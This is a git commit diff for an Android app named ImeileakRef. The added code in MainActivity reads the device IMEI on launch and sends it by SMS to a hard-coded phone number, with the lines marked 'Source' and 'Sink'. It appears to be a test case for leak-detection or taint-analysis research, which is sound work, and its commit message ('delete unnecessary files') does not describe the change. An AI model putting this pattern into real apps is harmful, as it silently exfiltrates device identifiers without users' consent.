a349ce803f31e1912166a8ee5221839f6427a06b
shivapbhusal <civabhusal@gmail.com>
2018-02-01 16:27:22 -0500

    delete unnecessary files

--- ImeileakRef/app/src/main/java/com/imeileakRef/MainActivity.java
+++ ImeileakRef/app/src/main/java/com/imeileakRef/MainActivity.java
@@ -1,12 +1,16 @@
 package com.imeileakRef;
 
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 import android.view.View;
 
 /**
  * Created by dewan on 1/27/18.
+ * Modified by Shiva on 2/1/18
  */
 
 public class MainActivity  extends Activity {
@@ -15,11 +19,11 @@ public class MainActivity  extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId(); //Source
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("4193784172", null, imei, null, null);  //Sink
     }
-    public void nextActivity(View view)
-    {
-        Intent intent = new Intent(MainActivity.this,HiddenActivity.class);
-        startActivity(intent);
-    }
+
 }
 
